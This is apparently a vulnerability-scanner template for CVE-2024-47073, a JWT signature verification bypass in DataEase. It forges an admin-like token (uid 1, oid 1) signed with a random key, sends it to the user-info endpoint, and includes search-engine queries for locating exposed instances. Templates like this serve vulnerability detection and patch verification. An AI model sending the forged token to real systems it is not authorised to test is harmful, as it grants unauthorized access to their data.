http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - data
    - '"oid":"1"'
    - code
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /de2api/user/info HTTP/1.1

    Host: {{Hostname}}

    X-DE-TOKEN: {{token}}

    '
id: CVE-2024-47073
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:dataease:dataease:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-47073
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-347
    epss-percentile: 0.97695
    epss-score: 0.49743
  description: 'DataEase is an open source data visualization analysis tool that helps
    users quickly analyze data and gain insights into business trends. In affected
    versions, the lack of signature verification of JWT tokens allows attackers to
    forge JWTs, which then allow access to any interface. The vulnerability has been
    fixed in v2.10.2 and all users are advised to upgrade. There are no known workarounds
    for this vulnerability.

    '
  impact: 'Attackers can forge JWT tokens to bypass authentication and gain unauthorized
    access to any interface.

    '
  metadata:
    fofa-query: body="dataease"
    product: dataease
    shodan-query: http.html:"dataease"
    vendor: dataease
    verified: true
  name: DataEase v2.10.2 - JWT Signature Verification Bypass
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-47073
  remediation: 'Update DataEase to version 2.10.2 or later.

    '
  severity: critical
  tags: cve,cve2024,dataease,jwt,vuln
variables:
  payload: '{"uid":1,"oid":1,"exp":{{unix_time(1000)}}}'
  token: '{{generate_jwt(payload,"HS256","random") }}'
